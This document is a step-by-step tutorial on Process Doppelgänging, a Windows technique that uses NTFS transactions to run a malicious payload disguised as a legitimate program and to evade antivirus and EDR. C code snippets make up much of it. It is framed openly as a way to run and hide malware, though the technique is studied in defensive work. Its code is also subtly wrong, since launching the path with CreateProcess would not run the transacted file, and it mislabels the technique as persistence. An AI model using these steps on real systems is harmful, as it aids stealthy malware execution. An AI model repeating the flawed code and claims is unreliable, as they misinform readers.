---
legal-banner: true
---

### **Establishing Persistence Using Process Doppelgänging**

**Process Doppelgänging** is a stealthy technique that abuses **Windows NTFS transactions** to execute malicious code disguised as a legitimate process.  
Because it avoids directly writing malicious binaries to disk, it often evades detection by traditional antivirus and EDR solutions.

### **Step 1: Creating a New Transaction**

1.  **Verify NTFS is in use**  
    This method only works on NTFS volumes due to its transactional file system features.  

2.  **Acquire necessary privileges**  
    Typically, administrative rights are required to create and manipulate transactions.  

3.  **Start an NTFS transaction**  
    Use the Windows API to begin a transaction, which allows filesystem changes without committing them:  
    ```c
    HANDLE hTransaction = CreateTransaction(NULL, 0, 0, 0, 0, 0, NULL);
    ```

### **Step 2: Replacing a Legitimate Executable**

1.  **Select a legitimate executable**  
    Pick a commonly run program with sufficient execution privileges.  

2.  **Create a transacted file with the same name**  
    Open the file within the transaction context:  
    ```c
    HANDLE hFile = CreateFileTransacted(
        L"[LegitimateExecutablePath]",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    ```

3.  **Write the malicious payload**  
    Load the malicious binary into memory and write it into the transacted file:  
    ```c
    WriteFile(hFile, [MaliciousExecutableData], [SizeOfData], &dwBytesWritten, NULL);
    ```

### **Step 3: Executing the Malicious Executable**

1.  **Run the transacted executable**  
    While the transaction is still active, launch the process. Windows will treat it as the legitimate program:  
    ```c
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcess(
        NULL,
        L"[LegitimateExecutablePath]",
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    );
    ```

### **Step 4: Rolling Back the Transaction**

1.  **Rollback changes**  
    After execution, rollback the transaction to remove the malicious binary from disk while the process remains running:  
    ```c
    RollbackTransaction(hTransaction);
    ```

### **Step 5: Cleanup**

1.  **Close handles and free resources**  
    Always release allocated resources to maintain stability:  
    ```c
    CloseHandle(hFile);
    CloseHandle(hTransaction);
    ```